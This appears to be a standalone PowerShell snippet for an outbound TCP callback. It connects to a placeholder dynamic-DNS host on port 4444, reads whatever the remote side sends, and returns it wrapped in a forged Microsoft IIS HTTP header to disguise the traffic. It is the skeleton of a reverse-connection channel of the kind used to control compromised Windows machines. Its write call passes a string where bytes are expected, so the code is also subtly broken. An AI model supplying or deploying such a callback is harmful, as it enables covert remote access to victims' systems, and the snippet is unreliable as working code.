$client = New-Object System.Net.Sockets.TCPClient("yourdomain.noip.com", 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = ("HTTP/1.1 200 OK\r\nServer: Microsoft-IIS/7.5\r\nConnection: close\r\n\r\n").concat("$data");
$stream.Write($sendback,0,$sendback.Length);
$stream.Flush();};
$client.Close();
